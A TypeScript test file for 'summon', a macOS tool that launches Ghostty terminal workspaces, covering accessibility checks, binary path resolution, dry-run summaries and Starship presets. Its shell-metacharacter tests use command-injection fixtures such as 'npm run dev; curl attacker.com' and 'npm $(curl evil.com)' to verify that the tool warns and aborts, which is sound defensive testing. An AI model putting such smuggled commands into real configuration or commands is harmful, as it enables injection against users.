    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "osascript" && args?.[0] === "-e" && String(args[1]).includes("System Events")) {
        throw Object.assign(new Error("spawnSync osascript ETIMEDOUT"), { code: "ETIMEDOUT", signal: "SIGKILL" });
      }
      if (bin === "osascript" && mainScript === "denied") throw new Error("execution error: System Events got an error: osascript is not allowed assistive access. (-1719)");
      if (bin === "/usr/bin/which") return "/usr/bin/stub\n";
      return "";
    });
    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");
    expect(writeSpy.mock.calls.map((c) => String(c[0])).join(" ")).not.toContain("Accessibility permission is required");
    expect(mockGenerateAppleScript).toHaveBeenCalled();

    writeSpy.mockClear();
    mainScript = "denied";
    await expect(launch("/tmp/workspace")).rejects.toThrow("Failed to execute workspace script");
    expect(writeSpy.mock.calls.map((c) => String(c[0])).join(" ")).toContain("Ghostty needs Accessibility permission");
    writeSpy.mockRestore();
  });

  it("skips accessibility check for --dry-run", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockAccessibilityDenied();

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    // Should NOT have exited
    expect(mockExit).not.toHaveBeenCalled();
    // Should have printed dry-run output
    const allOutput = logSpy.mock.calls.map((c) => String(c[0])).join(" ");
    expect(allOutput).toContain("dry-run");
    mockExit.mockRestore();
    logSpy.mockRestore();
  });

  it("pre-flight check runs for tree layouts too", async () => {
    const treeData = new Map([
      ["tree", "editor | shell"],
      ["pane.editor", "vim"],
      ["pane.shell", "shell"],
    ]);
    mockReadCustomLayout.mockReturnValue(treeData);
    mockIsCustomLayout.mockReturnValue(true);
    vi.mocked(listConfig).mockReturnValue(new Map([["layout", "mytree"]]));
    mockAccessibilityDenied();

    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await expect(launch("/tmp/workspace", { layout: "mytree" })).rejects.toThrow("Accessibility permission");
    const allWrites = writeSpy.mock.calls.map((c) => String(c[0])).join(" ");
    expect(allWrites).toContain("Accessibility permission is required");
    writeSpy.mockRestore();
  });
});

describe("falsy sidebarCommand guard", () => {
  it("launches successfully when sidebar is not set (uses default)", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["sidebar", ""]]));

    await launch("/tmp/workspace");

    // Empty sidebar falls through to default (lazygit), which gets resolved
    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        sidebarCommand: "/usr/bin/stub",
      }),
      "/tmp/workspace",
      null,
      undefined,
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
  });

  it("skips sidebar resolution when sidebarCommand is empty in the plan", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    // Override sidebar to empty string via CLI so planLayout produces sidebarCommand=""
    await launch("/tmp/workspace", { sidebar: "" });

    // sidebarCommand is "" (falsy), so ensureAndResolve is never called for sidebar.
    // No resolveCommand call for empty sidebar binary.
    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        sidebarCommand: "",
      }),
      "/tmp/workspace",
      null,
      undefined,
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
  });

  it("keeps whitespace-only commands unchanged because no executable can be parsed", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace", { editor: "   ", layout: "minimal" });

    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        editor: "   ",
      }),
      "/tmp/workspace",
      null,
      undefined,
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
  });
});

describe("command resolution deduplication (#32)", () => {
  it("calls resolveCommand only once per binary during launch", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "vim") return "/usr/bin/vim\n";
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "lazygit") return "/usr/bin/lazygit\n";
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });

    await launch("/tmp/workspace");

    // Each binary should be resolved exactly once, not twice
    const vimCalls = mockExecFileSync.mock.calls.filter(
      (c) => c[0] === "/usr/bin/which" && Array.isArray(c[1]) && c[1][0] === "vim",
    );
    const lazygitCalls = mockExecFileSync.mock.calls.filter(
      (c) => c[0] === "/usr/bin/which" && Array.isArray(c[1]) && c[1][0] === "lazygit",
    );
    expect(vimCalls).toHaveLength(1);
    expect(lazygitCalls).toHaveLength(1);
  });

  it("uses ensureCommand return value for path resolution instead of re-resolving", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "npm") return "/usr/local/bin/npm\n";
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });

    await launch("/tmp/workspace", { shell: "npm run dev" });

    // "command -v npm" should be called only once
    const npmCalls = mockExecFileSync.mock.calls.filter(
      (c) => c[0] === "/usr/bin/which" && Array.isArray(c[1]) && c[1][0] === "npm",
    );
    expect(npmCalls).toHaveLength(1);
  });
});

describe("command resolution cache for shared binaries (#61)", () => {
  it("resolves the same binary only once when used in multiple roles", async () => {
    // Set both editor and sidebar to "claude" so the same binary appears in two roles
    vi.mocked(listConfig).mockReturnValue(
      new Map([["editor", "claude"], ["sidebar", "claude"]]),
    );
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "claude") return "/usr/bin/claude\n";
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });

    await launch("/tmp/workspace");

    // "command -v claude" should be called only once, even though claude
    // is used for both editor and sidebarCommand roles
    const claudeCalls = mockExecFileSync.mock.calls.filter(
      (c) => c[0] === "/usr/bin/which" && Array.isArray(c[1]) && c[1][0] === "claude",
    );
    expect(claudeCalls).toHaveLength(1);
  });

  it("reuses cached path for duplicate binaries across roles", async () => {
    vi.mocked(listConfig).mockReturnValue(
      new Map([["editor", "vim"], ["sidebar", "vim"]]),
    );
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "vim") return "/usr/local/bin/vim\n";
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });

    await launch("/tmp/workspace");

    // "command -v vim" should be called only once
    const vimCalls = mockExecFileSync.mock.calls.filter(
      (c) => c[0] === "/usr/bin/which" && Array.isArray(c[1]) && c[1][0] === "vim",
    );
    expect(vimCalls).toHaveLength(1);

    // Both editor and sidebarCommand should use the resolved path
    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        editor: "/usr/local/bin/vim",
        sidebarCommand: "/usr/local/bin/vim",
      }),
      "/tmp/workspace",
      null,
      undefined,
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
  });
});
describe("dry-run summary header (#85)", () => {
  it("prefixes dry-run output with AppleScript-style summary comments", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toMatch(/^-- summon dry-run/);
    expect(output).toContain("-- Layout:");
    expect(output).toContain("-- Target: /tmp/workspace");
    // The AppleScript should follow after the header
    expect(output).toContain('tell application "Ghostty"');
    logSpy.mockRestore();
  });

  it("includes editor pane count in the summary", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, panes: "3" });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("3 editor panes");
    logSpy.mockRestore();
  });

  it("includes editor command in the summary", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, editor: "vim" });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("editor=vim");
    logSpy.mockRestore();
  });

  it("includes sidebar command in the summary", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, sidebar: "htop" });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("sidebar=htop");
    logSpy.mockRestore();
  });

  it("includes shell=true in the summary when shell is enabled", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("shell=true");
    logSpy.mockRestore();
  });

  it("includes shell=false in the summary when shell is disabled", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await launch("/tmp/workspace", { dryRun: true, layout: "minimal" });

    const output = logSpy.mock.calls[0]![0] as string;
    expect(output).toContain("shell=false");
    logSpy.mockRestore();
  });
});

describe("path resolution", () => {
  it("passes resolved full paths to generateAppleScript", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "vim") return "/usr/bin/vim\n";
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "lazygit") return "/opt/homebrew/bin/lazygit\n";
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace");

    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        editor: "/usr/bin/vim",
        sidebarCommand: "/opt/homebrew/bin/lazygit",
      }),
      "/tmp/workspace",
      null,
      undefined,
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
  });

  it("resolves only the binary part of compound shell commands", async () => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && Array.isArray(args) && args[0] === "npm") return "/usr/local/bin/npm\n";
      if (bin === "/usr/bin/which")
        return "/usr/bin/stub\n";
      return "";
    });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace", { shell: "npm run dev" });

    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
      expect.objectContaining({
        shellCommand: "/usr/local/bin/npm run dev",
      }),
      "/tmp/workspace",
      null,
      undefined,
      "workspace",
      undefined,
      ANY_LAUNCH_ID,
    );
  });
});

describe("shell metacharacter confirmation (#90)", () => {
  let origIsTTY: boolean | undefined;
  let savedSummonWorkspace: string | undefined;

  beforeEach(() => {
    origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
    savedSummonWorkspace = process.env.SUMMON_WORKSPACE;
    delete process.env.SUMMON_WORKSPACE;
  });

  afterEach(() => {
    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
    if (savedSummonWorkspace === undefined) {
      delete process.env.SUMMON_WORKSPACE;
    } else {
      process.env.SUMMON_WORKSPACE = savedSummonWorkspace;
    }
  });

  it("does not prompt when .summon values are safe", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["editor", "vim"], ["sidebar", "lazygit"], ["shell", "npm run dev"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    await launch("/tmp/workspace");

    // Verify the launch completed normally
    expect(mockGenerateAppleScript).toHaveBeenCalled();
  });

  it("prompts when .summon file contains semicolons in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; curl attacker.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    // User confirms
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains pipe in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["editor", "vim | tee log"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains ampersand in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev & evil"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains backticks in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run `evil`"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains $( in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm $(curl evil.com)"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains ${} parameter expansion (#119)", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "echo ${IFS}evil"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("prompts when .summon file contains redirect operators in command values", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev > /tmp/log"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    expect(warnSpy).toHaveBeenCalledWith(
      expect.stringContaining("shell metacharacters"),
    );
    warnSpy.mockRestore();
  });

  it("exits with code 1 when user declines the confirmation", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; curl attacker.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    // User declines
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("n");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const stderrSpy = warnSpy;

    await expect(launch("/tmp/workspace")).rejects.toThrow();
    const allWrites = stderrSpy.mock.calls.map((c) => String(c[0])).join("\n");
    expect(allWrites).toContain("Aborted.");

    warnSpy.mockRestore();
    stderrSpy.mockRestore();
  });

  it("aborts when user presses Enter (default is no — UX-H1 #528)", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; curl attacker.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    // User presses Enter (empty string) → aborts (N is the default, UX-H1 #528)
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("");
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const writeSpy = warnSpy;

    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(130);

    mockExit.mockRestore();
    warnSpy.mockRestore();
    writeSpy.mockRestore();
  });

  it("proceeds when user confirms with 'y'", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; echo done"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    // Should have completed normally
    expect(mockGenerateAppleScript).toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("proceeds when user confirms with 'yes'", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; echo done"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("yes");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    expect(mockGenerateAppleScript).toHaveBeenCalled();
    warnSpy.mockRestore();
  });

  it("exits with code 1 on non-TTY stdin with dangerous commands", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; curl attacker.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    // Simulate non-TTY
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    try {
      await expect(launch("/tmp/workspace")).rejects.toThrow();
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
      warnSpy.mockRestore();
    }
  });

  it("skips metacharacter check when --dry-run is set", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([["shell", "npm run dev; curl attacker.com"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace", { dryRun: true });

    // Should not have warned about metacharacters
    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);

    logSpy.mockRestore();
    warnSpy.mockRestore();
  });

  it("prompts for metacharacters from CLI flags when raw shell commands are preserved", async () => {
    mockReadKVFile.mockReturnValue(new Map()); // empty .summon file
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    try {
      await launch("/tmp/workspace", { shell: "npm run dev; echo done" });

      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
      const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
      expect(metaWarning).toBeDefined();
      expect(metaWarning).toContain("shell");
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
      warnSpy.mockRestore();
    }
  });

  it("prompts for metacharacters from machine config when raw shell commands are preserved", async () => {
    mockReadKVFile.mockReturnValue(new Map()); // empty .summon file
    vi.mocked(listConfig).mockReturnValue(
      new Map([["shell", "npm run dev; echo done"]]),
    );
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    try {
      await launch("/tmp/workspace");
      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
      const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
      expect(metaWarning).toBeDefined();
      expect(metaWarning).toContain("shell");
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
      warnSpy.mockRestore();
    }
  });

  it("lists all dangerous commands in the warning message", async () => {
    mockReadKVFile.mockReturnValue(
      new Map([
        ["editor", "vim | tee"],
        ["shell", "npm run dev; curl evil.com"],
      ]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb("y");
    });

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
    expect(metaWarning).toBeDefined();
    expect(metaWarning).toContain("editor");
    expect(metaWarning).toContain("vim | tee");
    expect(metaWarning).toContain("shell");
    expect(metaWarning).toContain("npm run dev; curl evil.com");

    warnSpy.mockRestore();
  });

  it("does not check non-command keys from .summon for metacharacters", async () => {
    // Keys like layout, panes, editor-size are not command values
    mockReadKVFile.mockReturnValue(
      new Map([["layout", "minimal"], ["panes", "3"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

    await launch("/tmp/workspace");

    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);

    warnSpy.mockRestore();
  });

  it("resolveConfig returns projectOverrides from .summon file", () => {
    mockReadKVFile.mockReturnValue(
      new Map([["editor", "vim"], ["shell", "npm run dev"]]),
    );
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

    const result = resolveConfigWithMockedSummon("/tmp/workspace", {});
    expect(result.projectOverrides).toBeInstanceOf(Map);
    expect(result.projectOverrides.get("editor")).toBe("vim");
    expect(result.projectOverrides.get("shell")).toBe("npm run dev");
  });

  // --- Starship preset integration ---

  describe("starship preset integration", () => {
    it("passes starshipConfigPath to generateAppleScript when preset configured and starship installed", async () => {
      mockIsStarshipInstalled.mockReturnValue(true);
      mockEnsurePresetConfig.mockReturnValue("/mock/.config/summon/starship/tokyo-night.toml");
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "tokyo-night"]]));

      await launch("/tmp/workspace");

      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        "/mock/.config/summon/starship/tokyo-night.toml",
        undefined,
        "workspace",
        undefined,
        ANY_LAUNCH_ID,
      );
    });

    it("passes null when no preset configured", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

      await launch("/tmp/workspace");

      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        null,
        undefined,
        "workspace",
        undefined,
        ANY_LAUNCH_ID,
      );
    });

    it("warns and passes null when preset configured but starship not installed", async () => {
      mockIsStarshipInstalled.mockReturnValue(false);
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "tokyo-night"]]));
      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

      await launch("/tmp/workspace");

      const msgs = warnSpy.mock.calls.map((c) => c[0] as string);
      expect(msgs.slice(0, 2)).toEqual([
        'summon: warning: starship-preset is set to "tokyo-night" but Starship is not installed. Skipping.\n',
        "Install Starship: https://starship.rs\n",
      ]);
      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        null,
        undefined,
        "workspace",
        undefined,
        ANY_LAUNCH_ID,
      );
      warnSpy.mockRestore();
    });

    it("warns and passes null when ensurePresetConfig throws", async () => {
      mockIsStarshipInstalled.mockReturnValue(true);
      mockEnsurePresetConfig.mockImplementation(() => {
        throw new Error("preset generation failed");
      });
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "bad-preset"]]));
      const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);

      await launch("/tmp/workspace");

      const msgs = warnSpy.mock.calls.map((c) => c[0] as string);
      expect(msgs).toContain('summon: warning: Failed to set up Starship preset "bad-preset": preset generation failed\n');
      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        null,
        undefined,
        "workspace",
        undefined,
        ANY_LAUNCH_ID,
      );
      warnSpy.mockRestore();
    });

    it("resolves preset from CLI override (highest priority)", () => {
      mockReadKVFile.mockReturnValue(new Map([["starship-preset", "gruvbox-rainbow"]]));
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "jetpack"]]));

      const result = resolveConfigWithMockedSummon("/tmp/workspace", { "starship-preset": "tokyo-night" });
      expect(result.starshipPreset).toBe("tokyo-night");
    });

    it("resolves preset from project .summon file", () => {
      mockReadKVFile.mockReturnValue(new Map([["starship-preset", "gruvbox-rainbow"]]));
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

      const result = resolveConfigWithMockedSummon("/tmp/workspace", {});
      expect(result.starshipPreset).toBe("gruvbox-rainbow");
    });

    it("resolves preset from global machine config", () => {
      mockReadKVFile.mockReturnValue(new Map());
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "jetpack"]]));

      const result = resolveConfigWithMockedSummon("/tmp/workspace", {});
      expect(result.starshipPreset).toBe("jetpack");
    });

    it("CLI preset overrides project preset", () => {
      mockReadKVFile.mockReturnValue(new Map([["starship-preset", "gruvbox-rainbow"]]));
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));

      const result = resolveConfigWithMockedSummon("/tmp/workspace", { "starship-preset": "tokyo-night" });
      expect(result.starshipPreset).toBe("tokyo-night");
    });

    it("project preset overrides global preset", () => {
      mockReadKVFile.mockReturnValue(new Map([["starship-preset", "gruvbox-rainbow"]]));
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "jetpack"]]));

      const result = resolveConfigWithMockedSummon("/tmp/workspace", {});
      expect(result.starshipPreset).toBe("gruvbox-rainbow");
    });

    it("dry-run includes starship config path in output", async () => {
      mockGetPresetConfigPath.mockReturnValue("/mock/.config/summon/starship/tokyo-night.toml");
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "tokyo-night"]]));
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { dryRun: true });

      const output = logSpy.mock.calls.map((c) => c[0] as string).join("\n");
      expect(output).toContain("Starship preset: tokyo-night");
      expect(output).toContain("/mock/.config/summon/starship/tokyo-night.toml");
      // generateAppleScript should receive the config path for dry-run
      expect(mockGenerateAppleScript).toHaveBeenCalledWith(
        expect.anything(),
        "/tmp/workspace",
        "/mock/.config/summon/starship/tokyo-night.toml",
        undefined,
        "workspace",
        undefined,
        ANY_LAUNCH_ID,
      );
      logSpy.mockRestore();
    });

    it("does not call ensurePresetConfig when dry-run", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["starship-preset", "tokyo-night"]]));
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { dryRun: true });

      expect(mockEnsurePresetConfig).not.toHaveBeenCalled();
      logSpy.mockRestore();
    });
  });

describe("on-start hook (#107)", () => {
    it("flags the launcher-tab watch for its inherited output and keeps the TTY (QA-M3); a launch without a hook flags nothing", async () => {
      mockResolveBackendForLaunch.mockReturnValue({ ok: true, backend: "rex", placement: "inside-rex", server: "unix:///tmp/rex.sock", rexBinary: "/usr/local/bin/rex", notices: [] });
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
      mockExecSync.mockImplementation((cmd: string) => {
        if (cmd === "echo setup") expect(mockMarkAttention).toHaveBeenCalledTimes(1);
        return "";
      });

      await launch("/tmp/workspace");
      expect(mockMarkAttention).not.toHaveBeenCalled();
      expect(mockCloseLauncherTab).toHaveBeenCalledTimes(1);

      await launch("/tmp/workspace", { "on-start": "echo setup" });
      expect(mockMarkAttention).toHaveBeenCalledTimes(1);
      expect(mockExecSync).toHaveBeenCalledWith("echo setup", expect.objectContaining({ stdio: "inherit" }));
      logSpy.mockRestore();
    });

    it("executes on-start command before workspace creation", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

      await launch("/tmp/workspace", { "on-start": "echo setup" });

      // execSync should have been called with the on-start command
      const onStartCalls = mockExecSync.mock.calls.filter(
        (c: unknown[]) => c[0] === "echo setup",
      );
      expect(onStartCalls.length).toBe(1);
